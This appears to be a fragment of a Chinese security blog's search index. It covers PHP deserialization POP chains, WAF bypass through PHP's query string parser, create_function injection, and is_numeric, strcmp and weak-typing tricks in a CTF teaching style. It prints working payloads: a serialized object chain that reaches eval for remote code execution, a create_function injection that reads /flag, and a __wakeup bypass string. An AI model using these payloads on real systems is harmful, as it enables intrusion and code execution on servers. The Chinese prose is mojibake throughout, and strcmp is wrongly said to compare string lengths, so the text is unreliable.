//ä¸å­˜åœ¨è¿™ä¸ªbbbbå±æ€§ï¼Œè°ƒç”¨ __get() echo $a-\u0026gt;bbbb; //nameæ˜¯ç§æœ‰å˜é‡ï¼Œä¸å…è®¸ä¿®æ”¹ï¼Œè°ƒç”¨ __set() $a-\u0026gt;name = \u0026#34;pro\u0026#34;; echo $a-\u0026gt;name; //å°†å¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œè°ƒç”¨ __invoke() $a(); //ç¨‹åºç»“æŸï¼Œè°ƒç”¨ __destruct() //ä¼šè°ƒç”¨ä¸¤æ¬¡__destructï¼Œå› ä¸ºä¸­é—´æœ‰ä¸€æ¬¡ååºåˆ—åŒ– //ç¬¬ä¸€æ¬¡æ˜¯å› ä¸ºååºåˆ—åŒ–åçš„å¯¹è±¡$cæ²¡æœ‰è¢«ä½¿ç”¨äº†ï¼Œæœ€åä¸€æ¬¡æ˜¯å› ä¸º$aæ²¡æœ‰å†è¢«ä½¿ç”¨äº† Property Oriented Programming (POP) é¢å‘å±æ€§ç¼–ç¨‹ è¿™ä¸ªæ¦‚å¿µæ ¹æ®æˆ‘çš„è°ƒæŸ¥ï¼Œåº”è¯¥ä¸æ˜¯ç±»ä¼¼äºï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆe.g., JAVAï¼‰,é¢å‘è¿‡ç¨‹ç¼–ç¨‹ï¼ˆCï¼‰è¿™ç§ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ç¼–ç¨‹ï¼Œè€Œæ˜¯å®‰å…¨é¢†åŸŸç‹¬æœ‰çš„ä¸€ç§å½¢å¼ã€‚ è¿™ä¹Ÿå¯¼è‡´äº†æˆ‘ä¸€å¼€å§‹å¾ˆéš¾ç†è§£è¿™ä¸ªæ¦‚å¿µï¼Œå› ä¸ºä¸åŒçš„å¸ˆå‚…ç”¨ä¸­è‹±æ–‡å†™å‡ºæ¥çš„ç†è§£æ€»æœ‰ä¸€äº›å·®åˆ« å› æ­¤æˆ‘ä»¬è¿™é‡Œå…ˆä¸ç€æ€¥ç»™POP Chainä¸‹å®šä¹‰ï¼Œå…ˆæ¥çœ‹ä¸€ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼Œç„¶åä¹Ÿè®¸å¤§å®¶èƒ½å¤Ÿç†è§£æˆ‘å¯¹äºPOPçš„æ€»ç»“ä¸å®šä¹‰ \u0026lt;?php class Example { private $obj; function __construct() { // some PHP code...  } function __wakeup() { if (isset($this-\u0026gt;obj)) return $this-\u0026gt;obj-\u0026gt;evaluate(); } } class CodeSnippet { private $code; function evaluate() { if (isset($this-\u0026gt;code)) { eval($this-\u0026gt;code); } } } // some PHP code...  if (isset($_POST[\u0026#39;data\u0026#39;])) { $user_data = unserialize($_POST[\u0026#39;data\u0026#39;]); } ä¸Šé¢çš„ä»£ç å®šä¹‰äº†ä¸¤ä¸ªç±»ï¼ŒExampleä»¥åŠCodeSnippet å…¶ä¸­Exampleä¸­é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªç§æœ‰çš„å±æ€§ $obj åŒæ—¶å®ç°äº† __wakeup() é­”æœ¯æ–¹æ³•ï¼Œå›å¿†ä¸€ä¸‹ï¼Œå…¶ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¢«è°ƒç”¨ï¼Œç„¶åæ‰§è¡Œ $obj è¿™ä¸ªå±æ€§ä¸­çš„æ–¹æ³• evaluate() CodeSnippetä¸­ä¹Ÿæœ‰ä¸€ä¸ªç§æœ‰å±æ€§ $code å®ç°äº†ä¸€ä¸ªæ–¹æ³• evaluate() å…¶å¯ä»¥æ‰§è¡Œ $code ä¸­çš„PHPä»£ç  ç„¶åè¯¥PHPè„šæœ¬ä¼šå¯¹POSTçš„å˜é‡ data è¿›è¡Œååºåˆ—åŒ– éšéšçº¦çº¦å¤§å®¶åº”è¯¥ä¹Ÿèƒ½æ„Ÿå—åˆ°äº›ä»€ä¹ˆï¼Œååºåˆ—åŒ–ï¼Ÿ__wakeup()ä¼šåœ¨ååºåˆ—åŒ–ä¸­è¢«è°ƒç”¨ï¼Ÿ æˆ‘ä»¬æ¥ç€æ¥çœ‹æˆ‘ä»¬åˆ°åº•å¯ä»¥è¿›è¡Œæ€æ ·çš„åˆ©ç”¨ï¼š \u0026lt;?php class CodeSnippet { private $code = \u0026#34;phpinfo();\u0026#34;; } class Example { private $obj; function __construct() { $this-\u0026gt;obj = new CodeSnippet(); } } print urlencode(serialize(new Example())); é»‘å®¢å¯ä»¥æ„é€ ä»¥ä¸Šçš„PHPè„šæœ¬ï¼Œç›®çš„æ˜¯ä¸ºäº†è¾“å‡ºä¸€ä¸ªåºåˆ—åŒ–åçš„å†…å®¹  é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªcodeSnippetç±»ï¼Œå¹¶ä¸”å…¶ä¸­æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ $code å…¶ä¸­åŒ…å«äº†phpä»£ç   æ¥ç€å®šä¹‰äº†ä¸€ä¸ªExampleç±»ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ $obj, åŒæ—¶å®ç°äº†é­”æœ¯æ–¹æ³• __construct, å…¶ä¸­æ„é€ äº†ä¸€ä¸ªæ–°çš„ CodeSnippet å¯¹è±¡ï¼Œå¹¶èµ‹å€¼ç»™ $obj  æœ€åæ–°å»ºä¸€ä¸ªExampleç±»å¹¶è¿›è¡Œåºåˆ—åŒ–åè¿›è¡Œurlç¼–ç åè¾“å‡º    Figure 4: PHP Chain serialized output\n  O%3A7%3A%22Example%22%3A1%3A%7Bs%3A12%3A%22%00Example%00obj%22%3BO%3A11%3A%22CodeSnippet%22%3A1%3A%7Bs%3A17%3A%22%00CodeSnippet%00code%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D ä¹‹åå°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä½œä¸ºPOSTå˜é‡æäº¤åˆ°æœåŠ¡ç«¯è„šæœ¬ï¼Œå°±å¯ä»¥å®ç°RCE  Figure 5: RCEæˆåŠŸæ‰§è¡Œ\n  è¿™é‡Œå€¼å¾—æ³¨æ„çš„å‡ ä»¶äº‹æ˜¯  PHPä¸­å˜é‡çš„è°ƒç”¨è®°å¾—ç”¨issetå…ˆåšåˆ¤æ–­å¦åˆ™ä¼šå‡ºç°å¦‚ä¸‹warning    Figure 6: Warning for undefinied property\n   è¦æ³¨æ„ä½¿ç”¨æµè§ˆå™¨å·¥å…·æ˜¯å¦å¦‚ä½ æ‰€æƒ³ï¼Œå¤§å®¶å¯ä»¥çœ‹åˆ°æˆ‘ç”¨äº†å¾ˆå¤šhackbarç±»ä¼¼çš„æ’ä»¶ï¼Œä»–ä»¬æ€»ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚å¯¹äºurlçš„è¿‡åº¦è§£æï¼Œæˆ–è€…æ˜¯åŠ å…¥ä¸€ä¸‹ä¸å¿…è¦çš„å‚æ•°ï¼Œå› æ­¤å‡ºç°å¥‡æ€ªçš„é—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨BurpæŠ“åŒ…æ¥çœ‹ä¸€çœ‹ï¼Œç„¶åæœ€ç¨³å¥çš„æ–¹æ³•è¿˜æ˜¯Burpæ¥è¿›è¡ŒHTTPè¯·æ±‚ï¼Œæœ€ç›´è§‚ã€‚   è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ¥æ€»ç»“ä¸€ä¸‹è¿™ä¸ªä¾‹å­å¹¶ç»™å‡ºPOPçš„å®šä¹‰  æˆ‘ä»¬åœ¨èƒ½å¤Ÿè·å–æœåŠ¡ç«¯è„šæœ¬æºç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡å¯¹äºååºåˆ—åŒ–å‡½æ•° unserialize() ä¼šè°ƒç”¨ __wakeup() é­”æœ¯æ–¹æ³•çš„ç‰¹æ€§ï¼Œ  æ„é€ Exampleä»¥åŠCodeSnippetç±»ï¼Œ  åŒæ—¶ä¸ºå…¶ä¸­çš„ å±æ€§ ï¼ˆ$codeï¼‰è¿›è¡Œèµ‹å€¼ï¼Œ  å¹¶ä¸”å¯ä»¥é€šè¿‡ __construct() æ–¹æ³•æ¥æ–°å»º CodeSnippet å¯¹è±¡($this-\u0026gt;obj)  æ¥ç€åºåˆ—åŒ–åä½œä¸ºä¸€ä¸ªå¯¹è±¡ï¼ˆæœ‰å±æ€§çš„å€¼çš„ï¼‰å‘é€ç»™æœåŠ¡ç«¯è„šæœ¬  è¿›è€ŒæœåŠ¡ç«¯ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨ __wakepup(), å¹¶åˆ©ç”¨æˆ‘ä»¬å·²ç»å®šä¹‰å¥½äº†å±æ€§å€¼è¿›è¡Œæ‰§è¡Œï¼Œå¯¼è‡´RCEçš„å‘ç”Ÿ   POPé¢å‘å±æ€§ç¼–ç¨‹ï¼Œå°±æ˜¯æˆ‘ä»¬é€šè¿‡æ„é€  ç›®æ ‡è„šæœ¬ ä¸­ç±»çš„ object ï¼Œå¹¶ä¸”ä¸ºå…¶ property, å±æ€§ èµ‹å€¼ï¼Œç»§è€Œè¿™äº› property, å±æ€§ ä¼šä½œä¸º æ•æ„Ÿå‡½æ•° çš„å‚æ•°æ¥æ‰§è¡Œæ¶æ„è¡Œä¸ºï¼š  å‘½ä»¤æ‰§è¡Œï¼šexec()ã€passthru()ã€popen()ã€system()  æ–‡ä»¶æ“ä½œï¼šfile_put_contents()ã€file_get_contents()ã€unlink()   POP Chain å°±æ˜¯ä»é­”æœ¯æ–¹æ³•å¼€å§‹ï¼Œæƒ³åŠæ³•æ‰¾åˆ°ä¸€æ¡è°ƒç”¨é“¾ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨åˆ°çš„ä¾‹å­ä¸­ï¼š unserialize() -\u0026gt; __wakeup() -\u0026gt; evaluate() -\u0026gt; eval() å°±æ˜¯ä¸€æ¡POPé“¾ï¼Œæˆ‘ä»¬å°±æ˜¯è¦æ‰¾åˆ°è¿™æ ·ä¸€æ¡å‡½æ•°è°ƒç”¨é“¾ï¼Œæœ€ç»ˆæ‰§è¡Œè¾“å…¥çš„æ¶æ„ä»£ç  ä»¥ä¸Šå°±æ˜¯å…¨éƒ¨çš„åŸºç¡€çŸ¥è¯†çš„ä¿¡æ¯ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å…·ä½“çš„é¢˜ç›®æ¥è¿›è¡Œè¿›ä¸€æ­¥çš„å·©å›ºå’Œæ‹“å±•ï¼ˆåº”è¯¥ä¼šæ–°å¼€ä¸€ç¯‡æ–‡ç« æ¥è®°å½•ï¼‰ å¸¸ç”¨æŠ€å·§ ç»•è¿‡é­”æœ¯æ–¹æ³•   __wakeup()\nåœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœä¸€ä¸ªå¯¹è±¡ç”³æ˜çš„å±æ€§ä¸ªæ•°å¤§äºå®é™…ä¸ªæ•°æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨è·³è¿‡ __wakeup() çš„æ‰§è¡Œ ä¾‹å¦‚ O:4:\u0026ldquo;Name\u0026rdquo;:2:{s:14:\u0026ldquo;ï¿½Nameï¿½username\u0026rdquo;;s:5:\u0026ldquo;admin\u0026rdquo;;s:14:\u0026ldquo;ï¿½Nameï¿½password\u0026rdquo;;i:100;} ğŸ‘‡ O:4:\u0026ldquo;Name\u0026rdquo;:3:{s:14:\u0026ldquo;ï¿½Nameï¿½username\u0026rdquo;;s:5:\u0026ldquo;admin\u0026rdquo;;s:14:\u0026ldquo;ï¿½Nameï¿½password\u0026rdquo;;i:100;} è¿™ä¸ªæƒ…å†µä¸‹å°±ä¼šç»•è¿‡ __wakeup() æ‰§è¡Œ   é…åˆPHPä¼ªåè®® ä½¿ç”¨ glob:// ä¼ªåè®®æ¥æŸ¥æ‰¾ç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ï¼ˆåŒæ—¶å¯ä»¥é…åˆæµ‹ä¿¡é“æ”»å‡»ä½¿ç”¨ï¼‰ åºåˆ—åŒ– é€šè¿‡å°†å­—ç¬¦ä¸²æ ‡è¯†ç¬¦ s ä¿®æ”¹æˆ S ä¾¿å¯ä»¥è§£é‡Šåå…­è¿›åˆ¶å­—ç¬¦ï¼Œä»è€Œè¿›è¡Œç»•è¿‡ å±æ€§èµ‹å€¼ å¯ä»¥é€šè¿‡æµ…copyæ¥ä¸ºå—é™çš„å±æ€§èµ‹å€¼ ä¾‹å¦‚ä»¥ä¸‹ä»£ç ï¼Œå°±å°† $a-\u0026gt;user ä½œä¸ºå¼•ç”¨ä¼ é€’ç»™ $a-\u0026gt;name ä»è€Œä¿æŒä¸¤ä¸ªå€¼çš„ä¸€è‡´ï¼Œå³ä½¿ $a-\u0026gt;name è¢«ä¿®æ”¹æˆ–è€…è¿‡æ»¤ï¼Œä½†æ˜¯é€šè¿‡ $a-\u0026gt;user ä¾ç„¶å¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ $a-\u0026gt;name = \u0026amp;$a-\u0026gt;user; Reference serialize:php.net Magic+Methods:php.net PHPååºåˆ—åŒ–æ¼æ´ç®€ä»‹åŠç›¸å…³æŠ€å·§å°ç»“ PHPåºåˆ—åŒ–ååºåˆ—åŒ–æ¼æ´æ€»ç»“ï¼ˆä¸€ç¯‡æ‡‚ï¼‰ PHPååºåˆ—åŒ–æ¼æ´è¯´æ˜ phpååºåˆ—åŒ–ä¸POPé“¾ Php+Destruct+Called+Twice PHP+Object+Injection+Exploitation+Notes Diving+into+unserialize():+POP+Chains phpååºåˆ—åŒ–åˆ©ç”¨â€”â€”POPé“¾æ„é€ å®ä¾‹ \u0026ldquo;Notice: Undefined variable\u0026rdquo;, \u0026ldquo;Notice: Undefined index\u0026rdquo;, \u0026ldquo;Warning: Undefined array key\u0026rdquo;, and \u0026ldquo;Notice: Undefined offset\u0026rdquo; using PHP Laravel+POPé“¾ç®€æ ","date":"2022-06-14T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_serialize_unserialize/","title":"PHP åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"},{"content":"å¦‚ä½•ç»•è¿‡PHPæŸ¥è¯¢å­—ç¬¦ä¸²è§£é‡Šå™¨ æœ¬æ–‡çš„å†…å®¹ä¸»è¦å‚è€ƒæˆ–è€…è¯´ç¿»è¯‘è‡ª Abusing PHP query string parser to bypass IDS, IPS, and WAF æˆ‘ä»¬çŸ¥é“PHPé€šè¿‡å‘urlä¸­å¢åŠ queryå‚æ•°æ¥è·å– $_GET çš„å€¼ï¼Œä¹Ÿå¯ä»¥ä»HTTP requestä¸­å¢åŠ  $_POST çš„å€¼ï¼Œå½“è¿™äº›å†…å®¹å‘é€åˆ°åç«¯åï¼Œä¼šé¦–å…ˆè¢«è½¬æ¢æˆæ•°ç»„å…ƒç´ ï¼Œä¾‹å¦‚ /?foo=bar ä¼šå˜æˆ Array([foo] =\u0026gt; \u0026quot;bar\u0026quot;) ,è€Œè¿™é¡¹å·¥ä½œå°±æ˜¯ç”± query string parser æ¥å®Œæˆçš„ã€‚ æŸ¥è¯¢å­—ç¬¦ä¸²è§£é‡Šå™¨ï¼Œ query string parser é¦–å…ˆä¼šåˆ é™¤ä¸€äº›å‚æ•°ä¸­çš„å­—ç¬¦æˆ–è€…ç”¨ä¸‹åˆ’çº¿ _ æ¥è¿›è¡Œæ›¿ä»£ã€‚ ä¾‹å¦‚ /?$20news[id%00=42 ä¼šè¢«è½¬æ¢æˆ Array([news_id] =\u0026gt; 42) å¦‚æœIDPS or WAFå®šä¹‰äº† new_id çš„å‚æ•°ä¸èƒ½ä¸ºéæ•°å­—çš„ç¬¦å·å°±å¯ä»¥ç”¨ä»¥ä¸Šçš„æ–¹æ³•è¿›è¡Œç»•è¿‡  Figure 1: Example1\n  æ­¤æ—¶ï¼Œ %20news[id%00 å°†ä¼šè¢«å­˜å‚¨åˆ° $_GET[\u0026quot;new_id\u0026quot;] ä¸­å» Why? PHPéœ€è¦å°†æ‰€æœ‰çš„å‚æ•°éƒ½è½¬æ¢æˆåˆæ³•çš„å˜é‡åï¼Œä¸ºäº†ä¿è¯å˜é‡åå¯ä»¥ç”¨ï¼Œ query string parser ä¼šåšä¸¤ä»¶äº‹æƒ…ï¼š  ç§»é™¤å¼€å¤´çš„ç©ºæ ¼  å°†ä¸€äº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰   ä¾‹å¦‚ï¼š    ç”¨æˆ·è¾“å…¥ URLè§£ç å PHPå®é™…å­˜å‚¨å˜é‡å     %20foo_bar%00 foo_bar foo_bar   foo%20bar%00 foo bar foo_bar   foo%5bbar foo[bar foo_bar    [What does a bash sequence \u0026lsquo;\\033999D\u0026rsquo; mean and where is it explained? \u0026lt;?php foreach ([ \u0026#34;{chr}foo_bar\u0026#34;, \u0026#34;foo{chr}bar\u0026#34;, \u0026#34;foo_bar{chr}\u0026#34; ] as $k =\u0026gt; $arg) { for ($i = 0; $i \u0026lt;= 255; ++$i) { echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo \u0026#34;[\u0026#34; . $arg . \u0026#34;] check \u0026#34; . bin2hex(chr($i)) . \u0026#34;\u0026#34;; parse_str(str_replace(\u0026#34;{chr}\u0026#34;, chr($i), $arg) . \u0026#34;=bla\u0026#34;, $o); usleep(5000); // æ‰¾åˆ°parse_strç»“æœæ˜¯ foo_bar æ‰€å¯¹åº”çš„å­—ç¬¦  if (isset($o[\u0026#34;foo_bar\u0026#34;])) { echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo $arg . \u0026#34; -\u0026gt; \u0026#34; . bin2hex(chr($i)) . \u0026#34; (\u0026#34; . chr($i) . \u0026#34;)\\n\u0026#34;; } } echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo \u0026#34;\\n\u0026#34;; } \\033 æ˜¯Cè¯­è¨€é£æ ¼çš„å…«è¿›åˆ¶å­—ç¬¦ï¼Œè¡¨ç¤ºä¸€ä¸ªè½¬ä¹‰ç¬¦å·ï¼Œ [999D è¡¨ç¤ºå°†cursorå…‰æ ‡å›é€€999åˆ—ï¼Œä½œç”¨æ˜¯å¼ºåˆ¶å°†å…‰æ ‡è¿”å›åˆ°å¼€å¤´ï¼Œ [k è¡¨ç¤ºæ¸…ç©ºå½“å‰è¡Œçš„å†…å®¹ï¼Œ \\r è¿˜æ˜¯å’Œæˆ‘ä»¬å¹³å¸¸è§åˆ°çš„ä¸€æ ·çš„ä½œç”¨ï¼Œå°±æ˜¯å°†å…‰æ ‡è¿”å›åˆ°ä¸€è¡Œçš„å¼€å¤´ è¿™ç§ç¼–ç ä¸»è¦å’Œç»ˆç«¯æ¨¡æ‹Ÿå™¨åˆå…³ç³»ï¼Œä¸åŒçš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ä½¿ç”¨ä¸åŒçš„åº“å¯èƒ½æ•ˆæœå°±ä¸ä¸€æ ·ï¼Œæ¯”å¦‚ ANSI X3.64 ä»¥åŠ ECMA-48 ä¸¤ç§æ ‡å‡†ã€‚ parse_str æ–¹æ³•ä¼šè¢«ç”¨åœ¨ get, post, cookie çš„å‚æ•°è·å–ä¸Šï¼Œé€šè¿‡ä¸‰ç§å½¢å¼æ¥è§‚å¯Ÿ parse_str çš„è¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»¥ä¸‹çš„ç¬¦å·ï¼ˆé™¤å»é‚£äº›åˆ†éš”ç¬¦ï¼‰å¯ä»¥è¢« parse_str æ–¹æ³•é”™è¯¯çš„è§£é‡Šä¸º foo_bar  Figure 2: parse_str.php\n   Figure 3: Characters pass the parse_str 1\n   Figure 4: Characters pass the parse_str 2\n  ","date":"2022-06-09T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_bypass_query_string_parser/","title":"å¦‚ä½•åˆ©ç”¨PHPæŸ¥è¯¢å­—ç¬¦ä¸²è§£é‡Šå™¨æ¥ç»•è¿‡IDPSä»¥åŠWAF"},{"content":"PHPç‰¹æ€§ç»•è¿‡æŠ€å·§ create_function ç»•è¿‡ å‚è€ƒï¼š [ä»£ç å®¡è®¡]PHPä»£ç å®¡è®¡ä¹‹create_function()å‡½æ•° é€‚ç”¨èŒƒå›´ï¼š PHP 4\u0026gt; = 4.0.1ï¼ŒPHP 5ï¼ŒPHP 7 create_function çš„ç›®çš„æ˜¯ä¸ºäº†æ„å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶å¯ä»¥èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ create_function(string $args,string $code) - string $args å£°æ˜çš„å‡½æ•°å˜é‡éƒ¨åˆ† - string $code æ‰§è¡Œçš„æ–¹æ³•ä»£ç éƒ¨åˆ† åŸºæœ¬ä½¿ç”¨ \u0026lt;?php $q = $_GET(\u0026#39;query\u0026#39;); $newfunc = create_function(\u0026#39;$a\u0026#39;, \u0026#39;echo $a\u0026#39;); echo \u0026#34;function name: $newfunc\\n\u0026#34;; $newfunc($q); ?\u0026gt; Figure 1: Output value\n  æˆ‘ä»¬è¦å…³æ³¨çš„æ˜¯è¿™ä¸ªåŒ¿åå‡½æ•°å®é™…ä¸Šåšäº†ä¸€ä»¶ä»€ä¹ˆäº‹æƒ…ï¼Œ create_function() ä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaæ ¼å¼ï¼‰ï¼Œç”¨lambdaå‘½åï¼Œ \u0026lt;?php function lambda_2($a){ echo $a; } ?\u0026gt;è®°ä½è¿™ä¸ªå‡½æ•°æ˜¯çœŸçš„éœ€è¦æ„é€ çš„ï¼Œç„¶åæˆ‘ä»¬æ¥çœ‹çœ‹ create_function æ³¨å…¥çš„ä¾‹å­ æ³¨å…¥å®ä¾‹ \u0026lt;?php //sorry , here is true last level //^_^ error_reporting(0); include \u0026#34;str.php\u0026#34;; $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if(preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;,$a)){ show_source(__FILE__); } else{ $a(\u0026#39;\u0026#39;,$b); } æˆ‘ä»¬ä¸å…³æ³¨è¿™ä¸ªæ­£åˆ™çš„ç»†èŠ‚ï¼Œåªéœ€è¦çŸ¥é“æˆ‘ä»¬å¯ä»¥ç”¨åæ–œæ æ¥è¡¨ç¤ºå…¨å±€ç©ºé—´Global spaceæ¥ç»•è¿‡å°±å¯ä»¥äº† ç›´æ¥çœ‹payload ?a=\\create_function\u0026amp;b=;}readfile(\u0026#39;/flag\u0026#39;); // æˆ‘ä¸€å¼€å§‹å¯¹äºçœ‹åˆ°å¾ˆå¤šäººä½¿ç”¨èŠ±æ‹¬å·å¾ˆä¸ç†è§£ï¼Œæ„Ÿè§‰éƒ½æ— æ³•é—­åˆæ‹¬å·æ˜¯æ€ä¹ˆå›äº‹ï¼Œä½†æ˜¯è®°å¾—åˆšæ‰æˆ‘ä»¬è¯´çš„åŒ¿åå‡½æ•°çš„æ„é€ å—ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™é‡Œæ„é€ äº†ä¸€ä¸ªæ€ä¹ˆæ ·çš„åŒ¿åå‡½æ•° create_function(\u0026#39;\u0026#39;, \u0026#39;;}readfile(\u0026#39;/flag\u0026#39;); /*\u0026#39;) \u0026lt;?php function lambda_1(){ ; }readfile(\u0026#39;/flag\u0026#39;); /* æ³¨é‡Š } ?\u0026gt;è¿™é‡Œåªæ˜¯åˆ›é€ äº†ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•çš„èµ‹å€¼ï¼Œå› æ­¤æ˜¯æ— æ³•ç›´æ¥æ‰§è¡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆç”¨ } æ¥é—­åˆåŒ¿åå‡½æ•°çš„å®šä¹‰ï¼Œç„¶ååœ¨å¤–é¢æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ³¨å…¥çš„ä»£ç å³å¯ is_numberic() ç»•è¿‡ å‚è€ƒï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag 1 å¯¹äºç©ºå­—ç¬¦ %00, æ— è®ºæ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ %20 æ”¾åœ¨æ•°å€¼åé¢ä¹Ÿå¯ä»¥åˆ¤å®šä¸ºéæ•°å€¼ strcmp ç»•è¿‡ å‚è€ƒï¼š [æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag 1 strcmp:php.net strcmp(string $string1, string $string2): int Return \u0026lt; 0; string1çš„é•¿åº¦å°äºstring2 Return \u0026gt; 0; string1çš„é•¿åº¦å¤§äºstring2 Return = 0; string1çš„é•¿åº¦ç­‰äºstring2 ç©¿å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œå‡½æ•°å‘ç”Ÿé”™è¯¯åœ¨ 5.3 ç‰ˆæœ¬ä¹‹å‰ï¼Œåœ¨æ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯ä¹‹åï¼Œå°†return 0ï¼Œä½œç”¨ä¸é•¿åº¦ç›¸ç­‰ä¸€è‡´ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ç©¿å…¥æ•°ç»„ç±»å‹æ¥å®Œæˆç»•è¿‡ å¼±ç±»å‹ å‚è€ƒï¼šphp å¼±ç±»å‹æ€»ç»“ ä¸€ç›´åˆ°ç¢°åˆ°å¼±ç±»å‹æ¯”è¾ƒçš„é¢˜ç›®ï¼Œä½†æ˜¯æ€»æ„Ÿè§‰å¾ˆé›¶ç¢ï¼Œçœ‹åˆ°ä¸€ç‰‡æ€»ç»“çš„æ–‡ç« ï¼Œå°±æƒ³ç€è·Ÿç€å­¦ä¸€å­¦ï¼Œæ€»ç»“ä¸€ä¸‹ å¼ºç±»å‹ï¼Œå¼±ç±»å‹ é¦–å…ˆæˆ‘ä»¬æ¥åŒºåˆ†ä¸€ä¸‹å¼ºç±»å‹è¯­è¨€å’Œå¼±ç±»å‹è¯­è¨€çš„åŒºåˆ« å¼ºç±»å‹è¯­è¨€ï¼Œå°±æ˜¯åœ¨å®šä¹‰ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œå°±éœ€è¦æŒ‡å®šå˜é‡çš„ç±»å‹ï¼Œå¦‚æœä¸ç»è½¬æ¢ï¼ˆæ‰‹åŠ¨æˆ–è€…è‡ªåŠ¨ï¼‰å°±ä½¿ç”¨å°±ä¼šæŠ¥é”™ï¼Œä¾‹å¦‚Javaï¼ŒCéƒ½æ˜¯å¼ºç±»å‹çš„è¯­è¨€ï¼Œæˆ‘ä»¬éƒ½éœ€è¦å…ˆå®šä¹‰ç±»å‹æ‰èƒ½è¿›è¡Œèµ‹å€¼ å¼±ç±»å‹è¯­è¨€ï¼Œå°±æ˜¯åœ¨å®šä¹‰ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œæ— éœ€å®šä¹‰ç±»å‹ï¼Œæƒ³æ€ä¹ˆä½¿ç”¨ï¼Œç”¨ä»€ä¹ˆèµ‹å€¼éƒ½å¯ä»¥ï¼Œè¯­è¨€çš„è§£æå™¨å›è‡ªåŠ¨è½¬æ¢ï¼Œä¾‹å¦‚phpï¼Œpythonéƒ½æ˜¯å¼±ç±»å‹çš„è¯­è¨€ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨çš„æ—¶å€™å°±èƒ½æ˜æ˜¾æ„Ÿå— PHPä¸­çš„æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ å‚è€ƒï¼š Comparison Operators:php.net phpä¸­æ¯”è¾ƒä¸¤ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰æœ‰ä¸¤ç§è¿ç®—ç¬¦ $a == $b, Equal ç›¸ç­‰ï¼Œè¿”å›trueåªè¦ $a åœ¨ç±»å‹è½¬æ¢ä¹‹åç­‰äº $b å³å¯ï¼ˆå› æ­¤ä¼šå…ˆè½¬æ¢æˆç›¸åŒçš„ç±»å‹ï¼Œå†æ¯”è¾ƒå€¼ï¼‰; $a === $b, identical ä¸€è‡´ï¼Œè¿”å›trueåªæœ‰ $a ä¸ $b å®Œå…¨ç›¸ç­‰ï¼Œå³å€¼ä¸€æ ·ï¼ŒåŒæ—¶ç±»å‹ä¹Ÿç›¸ç­‰ï¼ˆå› æ­¤å›æ˜¾åˆ¤æ–­ç±»å‹å†æ¯”è¾ƒå€¼, !== äº¦æ˜¯å¦‚æ­¤ï¼‰ \u0026lt;?php var_dump(0 == \u0026#34;a\u0026#34;); // true var_dump(\u0026#34;1\u0026#34; == \u0026#34;01\u0026#34;); // true var_dump(\u0026#34;10\u0026#34; == \u0026#34;1e1\u0026#34;); // true var_dump(100 == \u0026#34;1e2\u0026#34;); // true  var_dump(\u0026#34;admin\u0026#34;==0); // true var_dump(\u0026#34;1admin\u0026#34;==1); // true var_dump(\u0026#34;admin1\u0026#34;==1); // flase var_dump(\u0026#34;admin1\u0026#34;==0); // true var_dump(\u0026#34;0e123456\u0026#34;==\u0026#34;0e4456789\u0026#34;); // true 